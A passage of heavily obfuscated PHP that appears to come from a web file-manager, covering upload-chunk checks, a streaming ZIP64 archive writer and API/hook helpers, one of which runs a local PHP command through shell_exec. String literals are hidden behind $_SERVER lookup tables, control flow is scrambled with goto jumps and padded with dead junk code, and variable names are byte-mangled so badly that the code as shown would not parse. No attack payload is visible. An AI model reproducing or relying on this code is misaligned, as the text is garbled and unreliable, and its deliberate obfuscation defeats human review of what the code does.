$this->tempFile . $_SERVER[¹÷ˆ§éÒ°ú][1985]; if (!$AÕ“ØàÖ) { if (file_exists($F¦±¡ ó›)) { @unlink($F¦±¡ ó›); } return !0; } $this->statusData = $AÕ“ØàÖ; return file_put_contents($F¦±¡ ó›, json_encode($AÕ“ØàÖ)); } private function initFileTemp() { $f—‰­Åê–¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (file_exists($this->tempFile)) { return; } $aŒ¸¥©¸¿Œ = fopen($this->tempFile, $f—‰­Åê–¨[1986]); fseek($aŒ¸¥©¸¿Œ, $this->in[$f—‰­Åê–¨[89]] - 1, SEEK_SET); fwrite($aŒ¸¥©¸¿Œ, $f—‰­Åê–¨[481]); fclose($aŒ¸¥©¸¿Œ); } public function checkChunk() { goto D‹…§£Ü; D‹…§£Ü: $A¤Ä‘ì”Âä =& $_SERVER[¹÷ˆ§éÒ°ú]; $F«ÒÇÑ§Ğ = array(); CacheLock::lock($this->tempFile); goto b¼ç±ôŒ¬; b¼ç±ôŒ¬: $a£­©¥¨‹Æ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($a£­©¥¨‹Æ[$A¤Ä‘ì”Âä[1973]] as $CƒßÉ£„µí) { $dŠÙŠ›ÒÒ = $CƒßÉ£„µí[$A¤Ä‘ì”Âä[176]]; if ($dŠÙŠ›ÒÒ) { $F«ÒÇÑ§Ğ[$A¤Ä‘ì”Âä[1987] . $CƒßÉ£„µí[$A¤Ä‘ì”Âä[1027]]] = $dŠÙŠ›ÒÒ; } } goto c¤ôÅó±¿å; c¤ôÅó±¿å: return $F«ÒÇÑ§Ğ; goto FÅêÖæçñù; FÅêÖæçñù: } private function checkChunkHash($AæÏÂï´£•) { goto F¬–õ–âê; c¸Œæááá§: $C«’ÂÓ’†£ = _get($this->in, $AÒÜÉ²»›Ë[1988]); if (strlen($C«’ÂÓ’†£) == 32 && IO::hashSimple($this->tempFile) == $b‘ÂõÙšÅº && IO::hashMd5($this->tempFile) == $C«’ÂÓ’†£) { return !0; } $C…ßŸÎ³Ñ™ = fopen($this->tempFile, $AÒÜÉ²»›Ë[1161]); goto Bš‚«ÖÈšÊ; F¬–õ–âê: $AÒÜÉ²»›Ë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (count($AæÏÂï´£•[$AÒÜÉ²»›Ë[1973]]) != $AæÏÂï´£•[$AÒÜÉ²»›Ë[1972]]) { return !1; } $b‘ÂõÙšÅº = _get($this->in, $AÒÜÉ²»›Ë[1980]); goto c¸Œæááá§; dİÉŠ¾†±: return $AÇÜ¸Õá‚; goto FŒîÃ¯«ØÀ; Bš‚«ÖÈšÊ: $AÇÜ¸Õá‚ = !0; foreach ($AæÏÂï´£•[$AÒÜÉ²»›Ë[1973]] as $aËã®—ÛÀ¡) { fseek($C…ßŸÎ³Ñ™, $aËã®—ÛÀ¡[$AÒÜÉ²»›Ë[1975]]); $CòÈâÜÆÑ› = PathDriverStream::hash($C…ßŸÎ³Ñ™, $aËã®—ÛÀ¡[$AÒÜÉ²»›Ë[89]]); if ($aËã®—ÛÀ¡[$AÒÜÉ²»›Ë[176]] != $CòÈâÜÆÑ›) { $AÇÜ¸Õá‚ = !1; break; } } fclose($C…ßŸÎ³Ñ™); goto dİÉŠ¾†±; FŒîÃ¯«ØÀ: } public static function fileName() { goto Cä¦ÕË‰İš; Cä¦ÕË‰İš: $B¨É„ÔŠ†‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $in; $E¼Ä’·âÊ = isset($in[$B¨É„ÔŠ†‚[38]]) ? $in[$B¨É„ÔŠ†‚[38]] : $B¨É„ÔŠ†‚[43]; goto bôå›£Ú‹ö; fÚ÷ÂÚ«‚: $E‹—¬Çœ”„ = $E‹—¬Çœ”„ ? $E‹—¬Çœ”„ : time(); $b‘Ê“İï°“ = strtolower($E¼Ä’·âÊ); if ($b‘Ê“İï°“ == $B¨É„ÔŠ†‚[1990] || $b‘Ê“İï°“ == $B¨É„ÔŠ†‚[1991]) { $E¼Ä’·âÊ = date($B¨É„ÔŠ†‚[685], $E‹—¬Çœ”„) . $B¨É„ÔŠ†‚[82] . $in[$B¨É„ÔŠ†‚[89]] . $B¨É„ÔŠ†‚[1619]; } else { if ($b‘Ê“İï°“ == $B¨É„ÔŠ†‚[1992]) { $E¼Ä’·âÊ = date($B¨É„ÔŠ†‚[685], $E‹—¬Çœ”„) . $B¨É„ÔŠ†‚[82] . $in[$B¨É„ÔŠ†‚[89]] . $B¨É„ÔŠ†‚[1993]; } } goto Cß¢¶âÓìŞ; Cß¢¶âÓìŞ: return KodIO::clear($E¼Ä’·âÊ); goto eŞé³”‡Ñ–; bôå›£Ú‹ö: if (!empty($_FILES)) { $E¼Ä’·âÊ = $E¼Ä’·âÊ ? $E¼Ä’·âÊ : $_FILES[$B¨É„ÔŠ†‚[179]][$B¨É„ÔŠ†‚[397]]; } if (!is_wap()) { return KodIO::clear($E¼Ä’·âÊ); } $E‹—¬Çœ”„ = strtotime($in[$B¨É„ÔŠ†‚[1989]]); goto fÚ÷ÂÚ«‚; eŞé³”‡Ñ–: } private function errorInfo($c‹Ä¢ìæ) { $F¦›ÑÖ¨½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dË„ê‹Ñ± = array($F¦›ÑÖ¨½[1994], $F¦›ÑÖ¨½[1995], $F¦›ÑÖ¨½[1996], $F¦›ÑÖ¨½[1997], $F¦›ÑÖ¨½[1998], $F¦›ÑÖ¨½[1999], $F¦›ÑÖ¨½[2000], $F¦›ÑÖ¨½[2001]); return $c‹Ä¢ìæ . $F¦›ÑÖ¨½[14] . $dË„ê‹Ñ±[$c‹Ä¢ìæ]; } } class ZipMake { const VERSION = "\60\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($CÂéàé‚éÙ = null) { $BÆ¸ÅŠ•š· =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->outputStream = fopen($BÆ¸ÅŠ•š·[2002], $BÆ¸ÅŠ•š·[1217]); $this->outputName = $CÂéàé‚éÙ; $this->needHeaders = !0; } public function addFile($B¬­¸’”£Ë, $cÉù÷æ›Í‡) { goto EœÉÄŒÉ…×; e­¦äÀŸâ: $E‹¬¼éöåç = $this->addFileHeader($B¬­¸’”£Ë, $fØ ‹“Û¿); $B¸ôí¹ˆËß = $açÉ–¼±î² = filesize($cÉù÷æ›Í‡); $F°½ôçĞÖ¨ = fopen($cÉù÷æ›Í‡, $EÂËºÎ­Ó[2003]); goto B“ØùŠ—¯‚; EœÉÄŒÉ…×: $EÂËºÎ­Ó =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¬­¸’”£Ë = $this->filterFilename($B¬­¸’”£Ë); $fØ ‹“Û¿ = static::METHOD_STORE; goto e­¦äÀŸâ; dĞ‡âê½°Õ: $this->addFileFooter($B¬­¸’”£Ë, $fØ ‹“Û¿, $F—¿ì¾õìî, $B¸ôí¹ˆËß, $açÉ–¼±î², $E‹¬¼éöåç); goto c®…ÅÙÒÚ¡; B“ØùŠ—¯‚: while (!feof($F°½ôçĞÖ¨)) { $Cñšª½ÁÒ¢ = fread($F°½ôçĞÖ¨, 1048576); $this->send($Cñšª½ÁÒ¢); } fclose($F°½ôçĞÖ¨); $F—¿ì¾õìî = hexdec(hash_file($EÂËºÎ­Ó[2004], $cÉù÷æ›Í‡)); goto dĞ‡âê½°Õ; c®…ÅÙÒÚ¡: } public function addFileFromStream($Aš—“¬¿„‘, $A‹›Ô¿ó†ª) { goto e‹Øš„½‚Ç; e¡§Ìè‹êŠ: $this->addFileFooter($Aš—“¬¿„‘, $EÆ³™ÓæÉè, $eŠˆ «´ó…, $c Ÿ³äñàİ, $c½Úçªœ‡™, $eÈ‚êø÷Ğ´); goto Dô…‹ÕğÔ‹; EµéØêÛŠé: fseek($A‹›Ô¿ó†ª, 0, SEEK_END); $c Ÿ³äñàİ = $c½Úçªœ‡™ = ftell($A‹›Ô¿ó†ª); rewind($A‹›Ô¿ó†ª); goto eã ¬¿; eã ¬¿: $a°•›Å«ó = hash_init($_SERVER[¹÷ˆ§éÒ°ú][2004]); while (!feof($A‹›Ô¿ó†ª)) { $Bô¬«§Â±Ò = fread($A‹›Ô¿ó†ª, 1048576); hash_update($a°•›Å«ó, $Bô¬«§Â±Ò); $this->send($Bô¬«§Â±Ò); } $eŠˆ «´ó… = hexdec(hash_final($a°•›Å«ó)); goto e¡§Ìè‹êŠ; e‹Øš„½‚Ç: $Aš—“¬¿„‘ = $this->filterFilename($Aš—“¬¿„‘); $EÆ³™ÓæÉè = static::METHOD_STORE; $eÈ‚êø÷Ğ´ = $this->addFileHeader($Aš—“¬¿„‘, $EÆ³™ÓæÉè); goto EµéØêÛŠé; Dô…‹ÕğÔ‹: } public function finish() { foreach ($this->files as $f”ƒéŒâ­) { $this->addCdrFile($f”ƒéŒâ­); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($AêÑ¡éë’, $CÃêÅÏ÷´—) { goto bÇ‚„˜—Í‰; dŞ„ÒšŸº£: $eŸÄ…¹â = $this->dosTime(time()); $C½ÆÓ˜¢«» = array(array($C¿îÄÁÓ‡¤[2006], static::FILE_HEADER_SIGNATURE), array($C¿îÄÁÓ‡¤[2007], static::ZIP_VERSION_64), array($C¿îÄÁÓ‡¤[2007], 8), array($C¿îÄÁÓ‡¤[2007], $CÃêÅÏ÷´—), array($C¿îÄÁÓ‡¤[2006], $eŸÄ…¹â), array($C¿îÄÁÓ‡¤[2006], 0), array($C¿îÄÁÓ‡¤[2006], 4294967295), array($C¿îÄÁÓ‡¤[2006], 4294967295), array($C¿îÄÁÓ‡¤[2007], $BÛçÈ«Øá¬), array($C¿îÄÁÓ‡¤[2007], 32)); $f¦Şø„…µØ = array(array($C¿îÄÁÓ‡¤[2007], 1), array($C¿îÄÁÓ‡¤[2007], 28), array($C¿îÄÁÓ‡¤[2008], 0), array($C¿îÄÁÓ‡¤[2008], 0), array($C¿îÄÁÓ‡¤[2008], 0), array($C¿îÄÁÓ‡¤[2006], 0)); goto B±¾È¤˜¸; bÇ‚„˜—Í‰: $C¿îÄÁÓ‡¤ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AêÑ¡éë’ = preg_replace($C¿îÄÁÓ‡¤[2005], $C¿îÄÁÓ‡¤[43], $AêÑ¡éë’); $BÛçÈ«Øá¬ = strlen($AêÑ¡éë’); goto dŞ„ÒšŸº£; B±¾È¤˜¸: $e¢ØÔÕŞ…¥ = $this->packFields($C½ÆÓ˜¢«»); $AÚØ†ˆÌ‘² = $this->packFields($f¦Şø„…µØ); $this->send($e¢ØÔÕŞ…¥ . $AêÑ¡éë’ . $AÚØ†ˆÌ‘²); goto fÇ·¢ßÃ¸; fÇ·¢ßÃ¸: return strlen($e¢ØÔÕŞ…¥) + $BÛçÈ«Øá¬ + strlen($AÚØ†ˆÌ‘²); goto A’…Ë‡™îÕ; A’…Ë‡™îÕ: } protected function addFileFooter($c‘Ù½°£¥Î, $eùŞìÍªÛÓ, $B‹®¥™Êèõ, $EÏ£áİ†š, $b»Î”­äßù, $bïÎ²çœÇŸ) { $D¶¯Ø§¥®£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fŒ…¸ƒ©Œ = array(array($D¶¯Ø§¥®£[2006], static::DATA_DESCRIPTOR_SIGNATURE), array($D¶¯Ø§¥®£[2006], $B‹®¥™Êèõ), array($D¶¯Ø§¥®£[2008], $EÏ£áİ†š), array($D¶¯Ø§¥®£[2008], $b»Î”­äßù)); $EÛ¸Õ‹§ö‚ = $this->packFields($fŒ…¸ƒ©Œ); $this->send($EÛ¸Õ‹§ö‚); $EÈŠÎÁ¶Â¦ = $bïÎ²çœÇŸ + $EÏ£áİ†š + $D§ñÀ¡Ù™; $this->addToCdr($c‘Ù½°£¥Î, $eùŞìÍªÛÓ, $B‹®¥™Êèõ, $EÏ£áİ†š, $b»Î”­äßù, $EÈŠÎÁ¶Â¦); } private function addToCdr($f Æ¨µ·÷Ú, $CŸèÈ‚ÑÀ, $DŒÆÄ–â’Î, $CÒº†¥Ë±, $BÔèŠ‘™õ, $d†Ú¶º”È) { $this->files[] = array($f Æ¨µ·÷Ú, $CŸèÈ‚ÑÀ, $DŒÆÄ–â’Î, $CÒº†¥Ë±, $BÔèŠ‘™õ, $this->ofs); $this->ofs += $d†Ú¶º”È; } protected function addCdrFile($cÖàšËíÆ•) { goto BˆîÀó¹•; dŞà¸¿ñ‡: $bì¡ÌÖÜÅ = $this->dosTime(time()); $eĞÀí’ï´ø = array(array($FÃóİ†ğ˜ˆ[2006], static::CDR_FILE_SIGNATURE), array($FÃóİ†ğ˜ˆ[2007], static::ZIP_VERSION_64), array($FÃóİ†ğ˜ˆ[2007], static::ZIP_VERSION_64), array($FÃóİ†ğ˜ˆ[2007], 8), array($FÃóİ†ğ˜ˆ[2007], $cÑ©´ ¥â”), array($FÃóİ†ğ˜ˆ[2006], $bì¡ÌÖÜÅ), array($FÃóİ†ğ˜ˆ[2006], $Bâ³†íˆÏš), array($FÃóİ†ğ˜ˆ[2006], 4294967295), array($FÃóİ†ğ˜ˆ[2006], 4294967295), array($FÃóİ†ğ˜ˆ[2007], strlen($D’¢õŠÌù )), array($FÃóİ†ğ˜ˆ[2007], 32), array($FÃóİ†ğ˜ˆ[2007], strlen($d…ìÙİ…Ÿ)), array($FÃóİ†ğ˜ˆ[2007], 0), array($FÃóİ†ğ˜ˆ[2007], 0), array($FÃóİ†ğ˜ˆ[2006], 32), array($FÃóİ†ğ˜ˆ[2006], 4294967295)); $EÍˆÆ÷âæé = array(array($FÃóİ†ğ˜ˆ[2007], 1), array($FÃóİ†ğ˜ˆ[2007], 28), array($FÃóİ†ğ˜ˆ[2008], $fÓåîŠ‡Ö), array($FÃóİ†ğ˜ˆ[2008], $aÒ®à…ƒ–), array($FÃóİ†ğ˜ˆ[2008], $a¤¦ß©Ø˜¢), array($FÃóİ†ğ˜ˆ[2006], 0)); goto f¡ºäÑ±Ğ; f¡ºäÑ±Ğ: $cŠÄÇÏÍ‘Ø = $this->packFields($eĞÀí’ï´ø); $eƒ´¾ê‘¹ˆ = $this->packFields($EÍˆÆ÷âæé); $f­”£“ó… = $cŠÄÇÏÍ‘Ø . $D’¢õŠÌù  . $d…ìÙİ…Ÿ . $eƒ´¾ê‘¹ˆ; goto EŞèéõ¦·; BˆîÀó¹•: $FÃóİ†ğ˜ˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; list($D’¢õŠÌù , $cÑ©´ ¥â”, $Bâ³†íˆÏš, $aÒ®à…ƒ–, $fÓåîŠ‡Ö, $a¤¦ß©Ø˜¢) = $cÖàšËíÆ•; $d…ìÙİ…Ÿ = $FÃóİ†ğ˜ˆ[43]; goto dŞà¸¿ñ‡; EŞèéõ¦·: $this->send($f­”£“ó…); $this->cdr_ofs += strlen($f­”£“ó…); goto A¤ÄËÕ¦‹Ó; A¤ÄËÕ¦‹Ó: } protected function addCdr64Eof() { goto f¢À†‡Ğµ; EŒõ´Ïø: $Dò¶èô¸ = $this->ofs; $FĞÈÀµ½ = array(array($eù¨ß”œ[2006], static::ZIP64_CDR_EOF_SIGNATURE), array($eù¨ß”œ[2008], 44), array($eù¨ß”œ[2007], static::ZIP_VERSION_64), array($eù¨ß”œ[2007], static::ZIP_VERSION_64), array($eù¨ß”œ[2006], 0), array($eù¨ß”œ[2006], 0), array($eù¨ß”œ[2008], $c‹†Ø­Ú), array($eù¨ß”œ[2008], $c‹†Ø­Ú), array($eù¨ß”œ[2008], $dğøñïÛéó), array($eù¨ß”œ[2008], $Dò¶èô¸)); $Bè®Ê¸ÉŠ = $this->packFields($FĞÈÀµ½); goto bõæÁÂÂó×; f¢À†‡Ğµ: $eù¨ß”œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‹†Ø­Ú = count($this->files); $dğøñïÛéó = $this->cdr_ofs; goto EŒõ´Ïø; bõæÁÂÂó×: $this->send($Bè®Ê¸ÉŠ); goto E¸ï‡Ë‡ªõ; E¸ï‡Ë‡ªõ: } protected function addCdr64Locator() { goto EŒØë¶‰¸‡; EŒØë¶‰¸‡: $eà´âÖÖ×© =& $_SERVER[¹÷ˆ§éÒ°ú]; $E¼†–ŸÒ× = count($this->files); $D¦›»‚óê† = $this->cdr_ofs; goto cÁ§¼òÍ÷›; eà‚•ªÌ£¯: $this->send($FíÀ±Ø˜); goto Eùí”¯ç‡; cÁ§¼òÍ÷›: $Cåèµ—† = $this->ofs; $b¤ŠÜ°°Íî = array(array($eà´âÖÖ×©[2006], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($eà´âÖÖ×©[2006], 0), array($eà´âÖÖ×©[2008], $Cåèµ—† + $D¦›»‚óê†), array($eà´âÖÖ×©[2006], 1)); $FíÀ±Ø˜ = $this->packFields($b¤ŠÜ°°Íî); goto eà‚•ªÌ£¯; Eùí”¯ç‡: } protected function addCdrEof() { goto A³åôê†; A³åôê†: $b­ƒ–çÇÛë =& $_SERVER[¹÷ˆ§éÒ°ú]; $fïœ—‡Œ = count($this->files); $FŒ‘¾º–‚¢ = $this->cdr_ofs; goto D¦ôçï„ÅÆ; E–¬İ–äë‚: $cÅˆŞöŒÜÕ = $this->packFields($cò‘®”Ü±Š) . $cô‘Í÷¥ø÷; $this->send($cÅˆŞöŒÜÕ); goto dƒÂÒÈàÂ; D¦ôçï„ÅÆ: $F“Œİ„ù¨ò = $this->ofs; $cô‘Í÷¥ø÷ = $b­ƒ–çÇÛë[43]; $cò‘®”Ü±Š = array(array($b­ƒ–çÇÛë[2006], static::CDR_EOF_SIGNATURE), array($b­ƒ–çÇÛë[2007], 0), array($b­ƒ–çÇÛë[2007], 0), array($b­ƒ–çÇÛë[2007], $fïœ—‡Œ), array($b­ƒ–çÇÛë[2007], $fïœ—‡Œ), array($b­ƒ–çÇÛë[2006], 4294967295), array($b­ƒ–çÇÛë[2006], 4294967295), array($b­ƒ–çÇÛë[2007], strlen($cô‘Í÷¥ø÷))); goto E–¬İ–äë‚; dƒÂÒÈàÂ: } protected function addCdr() { foreach ($this->files as $BæŒõÖÀŒ¶) { $this->addCdrFile($BæŒõÖÀŒ¶); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $d·ğ¸Ûƒ¸± =& $_SERVER[¹÷ˆ§éÒ°ú]; $EåŒ˜ÎÄÉì = $d·ğ¸Ûƒ¸±[214]; if ($this->outputName) { $e¦ÇŠ¶ Ş = trim(str_replace(array($d·ğ¸Ûƒ¸±[125], $d·ğ¸Ûƒ¸±[67], $d·ğ¸Ûƒ¸±[105], $d·ğ¸Ûƒ¸±[79], $d·ğ¸Ûƒ¸±[10], $d·ğ¸Ûƒ¸±[983]), $d·ğ¸Ûƒ¸±[43], $this->outputName)); $fŞÇéİ•¿ˆ = rawurlencode($e¦ÇŠ¶ Ş); $EåŒ˜ÎÄÉì .= "\73\40\x66\151\154\x65\x6e\141\155\145\52\75\165\164\x66\x2d\x38\x27\x27{$fŞÇéİ•¿ˆ}"; } $bŒ®±ß–¦ = array($d·ğ¸Ûƒ¸±[211] => $d·ğ¸Ûƒ¸±[2009], $d·ğ¸Ûƒ¸±[2010] => $EåŒ˜ÎÄÉì, $d·ğ¸Ûƒ¸±[2011] => $d·ğ¸Ûƒ¸±[2012], $d·ğ¸Ûƒ¸±[2013] => $d·ğ¸Ûƒ¸±[2014], $d·ğ¸Ûƒ¸±[2015] => $d·ğ¸Ûƒ¸±[2016]); foreach ($bŒ®±ß–¦ as $cÑôŠ“×Ôë => $eÏ¤İ¸Å¨) { header($cÑôŠ“×Ôë . $d·ğ¸Ûƒ¸±[870] . $eÏ¤İ¸Å¨); } } protected function send($eƒáˆô±‡) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $eƒáˆô±‡); } protected final function dosTime($BÒ´ç¹ÆÚ…) { $C‡İö¡‰œµ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E…ÍÚ‚ÖÎ˜ = getdate($BÒ´ç¹ÆÚ…); if ($E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[1716]] < 1980) { $E…ÍÚ‚ÖÎ˜ = array($C‡İö¡‰œµ[1716] => 1980, $C‡İö¡‰œµ[2017] => 1, $C‡İö¡‰œµ[2018] => 1, $C‡İö¡‰œµ[2019] => 0, $C‡İö¡‰œµ[2020] => 0, $C‡İö¡‰œµ[2021] => 0); } $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[1716]] -= 1980; return $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[1716]] << 25 | $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[2017]] << 21 | $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[2018]] << 16 | $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[2019]] << 11 | $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[2020]] << 5 | $E…ÍÚ‚ÖÎ˜[$C‡İö¡‰œµ[2021]] >> 1; } protected function packFields($c×Ã¸ÄôÕ¢) { $B—ìÚ˜ÍŠ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fŒÉ©ŸÒ¾½ = $B—ìÚ˜ÍŠ[43]; $B‹ÂñŞ™êå = array(); foreach ($c×Ã¸ÄôÕ¢ as $dÜ£µçá´ñ) { $fŒÉ©ŸÒ¾½ .= $dÜ£µçá´ñ[0]; $B‹ÂñŞ™êå[] = $dÜ£µçá´ñ[1]; } array_unshift($B‹ÂñŞ™êå, $fŒÉ©ŸÒ¾½); return call_user_func_array($B—ìÚ˜ÍŠ[2022], $B‹ÂñŞ™êå); } protected function filterFilename($BÆˆ—É÷¢) { $aˆÖã­ä“† =& $_SERVER[¹÷ˆ§éÒ°ú]; return str_replace(array($aˆÖã­ä“†[105], $aˆÖã­ä“†[14], $aˆÖã­ä“†[188], $aˆÖã­ä“†[81], $aˆÖã­ä“†[125], $aˆÖã­ä“†[915], $aˆÖã­ä“†[918], $aˆÖã­ä“†[282]), $aˆÖã­ä“†[82], $BÆˆ—É÷¢); } } class ZipStream { } goto A§Ğß³ÖçÃ; BÆÒ¹‹Ì­ù: function ActionCall($F…¢Éß—Â) { $c©óÀÑ± = array_slice(func_get_args(), 1); return ActionApply($F…¢Éß—Â, $c©óÀÑ±); } function ActionCallApi($D¢¾îÍõ¸Î, $dÂËò¾ÓÓ§ = '') { goto E›íìº»è«; D«¤Ï”¥ç«: $f¯ÚÆƒ£¼ğ = phpBinCommand(); if ($f¯ÚÆƒ£¼ğ && function_exists($E‚êÌø¯Š[21])) { $cÍ˜ùã÷Ü» = $f¯ÚÆƒ£¼ğ . $E‚êÌø¯Š[22] . BASIC_PATH . $E‚êÌø¯Š[23] . escapeshellarg($D¢¾îÍõ¸Î); $dÀØ¡ÅßÑÖ = shell_exec($cÍ˜ùã÷Ü»); } if (!$dÀØ¡ÅßÑÖ) { $Fõ°Ş¨Ø‹ = stream_context_create(array($E‚êÌø¯Š[24] => array($E‚êÌø¯Š[25] => 20, $E‚êÌø¯Š[26] => $E‚êÌø¯Š[27]))); $dÀØ¡ÅßÑÖ = file_get_contents(APP_HOST . $E‚êÌø¯Š[28] . $D¢¾îÍõ¸Î, !1, $Fõ°Ş¨Ø‹); } goto CÛÎ‰ÒßÒ¡; aßÓŠÈ÷¬ƒ: $c½¹¤ï†Ó‘ = Action($E‚êÌø¯Š[19])->accessToken(); $D¢¾îÍõ¸Î = str_replace($E‚êÌø¯Š[5], $E‚êÌø¯Š[4], $D¢¾îÍõ¸Î) . $E‚êÌø¯Š[20] . $c½¹¤ï†Ó‘ . $CŸå¤‡Œ¼Œ; $dÀØ¡ÅßÑÖ = $E‚êÌø¯Š[16]; goto D«¤Ï”¥ç«; E›íìº»è«: $E‚êÌø¯Š =& $_SERVER[Œá²]; $CŸå¤‡Œ¼Œ = $dÂËò¾ÓÓ§; if (is_array($dÂËò¾ÓÓ§)) { $CŸå¤‡Œ¼Œ = $E‚êÌø¯Š[16]; foreach ($dÂËò¾ÓÓ§ as $céæÈ¤È– => $EøÛ‚…†‡ğ) { $EøÛ‚…†‡ğ = is_array($EøÛ‚…†‡ğ) ? json_encode($EøÛ‚…†‡ğ) : $EøÛ‚…†‡ğ; $EøÛ‚…†‡ğ = is_bool($EøÛ‚…†‡ğ) ? intval($EøÛ‚…†‡ğ) : $EøÛ‚…†‡ğ; $CŸå¤‡Œ¼Œ .= $E‚êÌø¯Š[17] . $céæÈ¤È– . $E‚êÌø¯Š[18] . rawurlencode($EøÛ‚…†‡ğ); } } goto aßÓŠÈ÷¬ƒ; EœÈØ§²: return $dÚåØ’‹–µ; goto CÍØ°­Â¿á; CÛÎ‰ÒßÒ¡: $FŞ¿‹À¨‚‚ = json_decode($dÀØ¡ÅßÑÖ, !0); $dÚåØ’‹–µ = is_array($FŞ¿‹À¨‚‚) ? $FŞ¿‹À¨‚‚ : array($E‚êÌø¯Š[29] => null, $E‚êÌø¯Š[30] => $dÀØ¡ÅßÑÖ); if (!$FŞ¿‹À¨‚‚) { echo $dÀØ¡ÅßÑÖ; } goto EœÈØ§²; CÍØ°­Â¿á: } function ActionCallHook($DÏÜ¹Œ˜½ã) { goto A—ìõÆÇà; C¢–ë†…÷¼: $BâÉ÷ª‡ªø = $bº¥±•Ä³ ? json_decode($bº¥±•Ä³, !0) : $BâÉ÷ª‡ªø; $GLOBALS[$FøøŸÚŸÜ…[31]] = 0; return $BâÉ÷ª‡ªø; goto a¨¬¾ÑÕÊ; AÏ³İ¥ƒ³: $GLOBALS[$FøøŸÚŸÜ…[31]] = 1; $BâÉ÷ª‡ªø = ActionApply($DÏÜ¹Œ˜½ã, $fù‰É£¸áä); $bº¥±•Ä³ = ob_get_clean(); goto C¢–ë†…÷¼; A—ìõÆÇà: $FøøŸÚŸÜ… =& $_SERVER[Œá²]; ob_start(); $fù‰É£¸áä = array_slice(func_get_args(), 1); goto AÏ³İ¥ƒ³; a¨¬¾ÑÕÊ: } goto b³ï¯¤Ïøï; eÕó™·¸ì›: class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($BÙù¿­öÕì) { goto Cìâø“ÓªÑ; dŞÏ‘ğœ†Ã: $a»ƒæº–á = $A‹½ÁÔùÔ³[565]; if (!$a»ƒæº–á) { return; } $this->defaultModule = $dÏ™Üºåè[0] ? $dÏ™Üºåè[0] : $this->defaultModule; goto Fï¾ØÎµ”•; A‡öÏªê: $this->{$_SERVER[ÌœÆÒÍÚÇ²][3]}($c“œ¢†ÛÄ[4], array($this, $c“œ¢†ÛÄ[5])); goto eÂÂ˜è×›£; Cìâø“ÓªÑ: $A‹½ÁÔùÔ³ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c“œ¢†ÛÄ =& $_SERVER[ÌœÆÒÍÚÇ²]; $dÏ™Üºåè = $c“œ¢†ÛÄ[0]($c“œ¢†ÛÄ[1], $c“œ¢†ÛÄ[2]($BÙù¿­öÕì, $c“œ¢†ÛÄ[1])); goto dŞÏ‘ğœ†Ã; Fï¾ØÎµ”•: $cÒÄ¸¼™°§ = $A‹½ÁÔùÔ³[566]; while ($cÒÄ¸¼™°§ < $A‹½ÁÔùÔ³[567]) { if ($cÒÄ¸¼™°§ >= 0) { break; } $cÒÄ¸¼™°§++; } $this->defaultController = $dÏ™Üºåè[1] ? $dÏ™Üºåè[1] : $this->defaultController; goto C®¯²•òÙˆ; C®¯²•òÙˆ: $bÍĞÍìÌÊ = $A‹½ÁÔùÔ³[568]; if (strlen($bÍĞÍìÌÊ) < $A‹½ÁÔùÔ³[11]) { die; } $this->defaultAction = $dÏ™Üºåè[2] ? $dÏ™Üºåè[2] : $this->defaultAction; goto A‡öÏªê; eÂÂ˜è×›£: } public function appRun($cñ‰Ëóƒ¤ã) { goto F×‘§Â¨È; aôÉª‚°Ë: $F–ç¯èß®ó[17]($cñ‰Ëóƒ¤ã); $F–ç¯èß®ó[13](array($F–ç¯èß®ó[14], $F–ç¯èß®ó[15]), $BôÂè­íğ . $F–ç¯èß®ó[18], $cñ‰Ëóƒ¤ã); goto AçÍ¼µÂ„÷; b¼¿¤İÑÊ¾: $BôÂè­íğ = $F–ç¯èß®ó[7]; if ($bõŠ¿ÙĞõ‹ == $F–ç¯èß®ó[8]) { $BôÂè­íğ = $F–ç¯èß®ó[9]; $aØŞÑˆíò[0] = $F–ç¯èß®ó[10]; $aØŞÑˆíò[1] = $aØŞÑˆíò[1] . $F–ç¯èß®ó[11]; $cñ‰Ëóƒ¤ã = $F–ç¯èß®ó[12]($F–ç¯èß®ó[1], $aØŞÑˆíò); $cñ‰Ëóƒ¤ã = $F–ç¯èß®ó[2]($cñ‰Ëóƒ¤ã, $F–ç¯èß®ó[1]); } $F–ç¯èß®ó[13](array($F–ç¯èß®ó[14], $F–ç¯èß®ó[15]), $BôÂè­íğ . $F–ç¯èß®ó[16], $cñ‰Ëóƒ¤ã); goto aôÉª‚°Ë; F×‘§Â¨È: $F–ç¯èß®ó =& 